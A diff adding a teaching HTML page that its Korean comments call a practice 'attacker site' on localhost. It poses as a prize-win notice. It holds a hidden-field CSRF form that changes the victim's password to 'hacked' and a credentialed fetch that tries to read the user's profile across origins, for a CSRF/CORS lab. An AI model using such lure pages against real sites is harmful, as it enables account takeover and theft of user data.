@@ -1,0 +1,34 @@
+<!doctype html>
+<html lang="ko">
+  <head>
+    <meta charset="UTF-8" />
+    <title>이벤트 당첨!</title>
+  </head>
+  <!-- 실습용 "공격자 사이트" (localhost:4000). 실행: frontend 폴더에서 npx vite evil-site --port 4000 -->
+  <body style="font-family: sans-serif; max-width: 640px; margin: 40px auto">
+    <h1>축하합니다! 경품 이벤트에 당첨되었습니다</h1>
+
+    <!-- 2단계: 사용자가 모르게 비밀번호 변경 요청을 보낸다 (CSRF) -->
+    <form method="POST" action="http://localhost:8080/account/password">
+      <input type="hidden" name="newPassword" value="hacked" />
+      <button style="font-size: 20px; padding: 12px 24px">경품 받기</button>
+    </form>
+
+    <hr style="margin: 40px 0" />
+
+    <!-- 4단계: 로그인한 사용자의 정보를 읽어 오려고 한다 (CORS) -->
+    <button id="peek">내 정보 훔쳐보기</button>
+    <pre id="out"></pre>
+    <script>
+      document.getElementById('peek').onclick = async () => {
+        const out = document.getElementById('out')
+        try {
+          const res = await fetch('http://localhost:8080/api/me', { credentials: 'include' })
+          out.textContent = res.status + ' ' + (await res.text())
+        } catch (e) {
+          out.textContent = '읽기 실패: ' + e.message + ' — Console 탭을 확인하세요'
+        }
+      }
+    </script>
+  </body>
+</html>
